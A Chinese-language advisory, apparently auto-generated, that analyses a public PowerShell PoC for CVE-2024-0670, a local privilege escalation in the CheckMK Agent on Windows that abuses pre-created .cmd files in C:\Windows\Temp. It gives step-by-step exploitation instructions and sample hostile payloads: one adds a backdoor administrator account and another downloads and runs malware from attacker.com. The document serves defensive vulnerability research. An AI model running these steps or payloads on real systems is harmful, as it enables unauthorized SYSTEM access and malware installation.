## CVE-2024-0670 - CheckMK Agent 本地权限提升 (Local Privilege Escalation)

**漏洞编号:** CVE-2024-0670

**漏洞类型:** 本地权限提升 (Local Privilege Escalation)

**影响应用:** CheckMK Agent

**危害等级:** 高危 (High)

**CVSS评分:** CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

**影响版本:** Checkmk Agent versions 2.2.0p18及更早版本, 2.1.0p40及更早版本, 2.0.0p41及更早版本

**利用条件:** 需要本地访问权限，攻击者需具备低权限用户身份。利用时无需用户交互，且攻击复杂度较低。系统需安装受影响版本的CheckMK Agent。

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

POC有效性分析: 该PowerShell脚本`CVE-2024-0670.ps1`是一个功能完整且高度有效的概念验证（PoC）代码，旨在精确地演示和利用CheckMK Agent在Windows系统上存在的本地权限提升漏洞（CVE-2024-0670）。该漏洞的核心在于CheckMK Agent在执行安装或修复操作时，会以SYSTEM权限尝试在`C:\Windows\Temp`目录中创建并执行特定命名的临时`.cmd`文件。攻击者正是利用了这一行为模式。该PoC脚本的利用流程设计巧妙且高效。首先，它会执行一系列预检查，包括验证对`C:\Windows\Temp`目录的读写权限，这是成功利用的关键前置条件。如果这些条件不满足，脚本会立即报错并终止，增加了其稳定性。接着，脚本会智能地通过查询Windows注册表（`HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties`）来定位当前系统上安装的CheckMK MSI安装包的路径，确保了针对性。随后，PoC进入其最关键的阶段：在`C:\Windows\Temp`目录中预先创建大量文件名符合CheckMK Agent预期临时文件命名规则的`.cmd`文件。这些文件的命名模式通常包含随机或递增的PID和计数器，例如`cmk_all_$($i)_$($c).cmd`。每个预创建的`.cmd`文件都被写入了攻击者预定义（通过`$Cmd`参数）的任意命令，并被设置为只读属性。这样做的目的是当CheckMK Agent以SYSTEM权限尝试在此目录创建同名临时文件时，由于文件已存在且被保护，Agent无法覆盖，但其执行机制仍会尝试运行已存在的（恶意）只读文件。最终，脚本通过调用`Start-Process "msiexec.exe" -ArgumentList "/fa \"$Installer\"" -Wait`命令来触发CheckMK安装程序的“修复”操作。此操作会强制CheckMK Agent重新初始化其组件，并在此过程中触发其以SYSTEM权限创建和执行临时文件的行为，从而导致攻击者预置的恶意命令被执行，成功实现本地权限提升。整个过程自动化程度高，无需复杂的用户交互，充分验证了CVE-2024-0670的实际可利用性。

利用步骤:
1.  **环境识别与准备**: 确认目标Windows系统上已安装CheckMK Agent，并且其版本在受影响范围之内（例如，2.2.0p18及更早版本）。攻击者需要拥有目标系统的本地普通用户权限，以便登录并执行PoC脚本。验证当前用户对`C:\Windows\Temp`目录具有读写权限。该目录通常对普通用户开放写入权限，因此这一条件通常容易满足。
2.  **获取与配置PoC脚本**: 下载或传输`CVE-2024-0670.ps1` PowerShell脚本到目标系统。**关键配置**: 修改脚本中的`$Cmd`参数。默认的命令是`"whoami > C:\Windows\Temp\whoami.txt"`，这仅用于验证漏洞。在实际攻击中，攻击者会将其替换为高权限的恶意命令，例如：`"net user MaliciousUser MaliciousPass /add && net localgroup Administrators MaliciousUser /add"` (添加管理员用户) 或 `"powershell.exe -NoP -NonI -Exec Bypass -C \"Invoke-WebRequest -Uri http://attacker.com/malware.exe -OutFile C:\\Windows\\Temp\\malware.exe; Start-Process C:\\Windows\\Temp\\malware.exe\""` (下载并执行恶意软件)。
3.  **执行PoC脚本**: 打开PowerShell终端（以普通用户身份）。导航到脚本所在目录。执行脚本：`.\CVE-2024-0670.ps1 -Cmd "Your_Configured_Malicious_Command_Here"`。脚本将自动执行以下操作：检查`C:\Windows\Temp`权限；查找CheckMK Agent的MSI安装程序路径；在`C:\Windows\Temp`中创建数千个带有只读属性的`.cmd`文件，每个文件都包含攻击者配置的命令（此过程可能需要一些时间，脚本会显示进度条）；通过`msiexec.exe`命令触发CheckMK Agent的修复流程，促使其尝试创建并执行临时文件。
4.  **结果验证**: 在脚本执行完毕后，根据配置的恶意命令检查预期的结果。如果使用的是`whoami > C:\Windows\Temp\whoami.txt`，则检查`C:\Windows\Temp\whoami.txt`文件。如果内容显示为`nt authority\system`，则表示权限提升成功。如果添加了用户，则通过`net localgroup Administrators`命令验证新用户是否已被加入管理员组。

投毒风险分析: 该PoC的投毒风险评估为**低**（10%）。这一判断基于对PoC代码的深入审查及其固有的特性。首先，**代码透明性与可读性**极高，PoC脚本采用PowerShell编写，语言逻辑结构清晰，未见任何混淆或加密技术。这使得任何具备基本PowerShell知识的分析人员都能轻松审查代码，理解其功能，从而快速识别潜在的恶意行为。其次，**无害的默认载荷**是降低风险的重要因素。脚本中的默认攻击载荷`$Cmd = "whoami > C:\Windows\Temp\whoami.txt"`仅用于验证漏洞是否成功利用，不具备任何破坏性、窃密或后门植入功能。再者，PoC**缺乏外部依赖和网络行为**，它完全独立运行，不包含从外部URL下载代码、动态加载可执行文件、建立出站网络连接或执行其他可疑网络通信的代码。这种自包含性极大降低了通过外部资源引入恶意代码的风险。此外，脚本中**无动态代码执行**（如`Invoke-Expression`、`eval`），进一步减少了运行时被篡改或执行意外恶意逻辑的可能性。最后，`README.md`文件明确指出该项目是一个“概念验证（PoC）”，旨在“用于教育、研究目的”，虽然不能完全排除风险，但表明了作者的防御性安全研究意图。综上所述，尽管任何PoC都存在被恶意滥用的可能性，但此PoC本身的代码实现和结构使其内部投毒的风险极低，非常适合在受控的防御性安全研究环境中使用，前提是使用前对`$Cmd`参数进行审查。

**项目地址:** https://github.com/SEC-CONSULT/CVE-2024-0670-PoC

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2024-0670
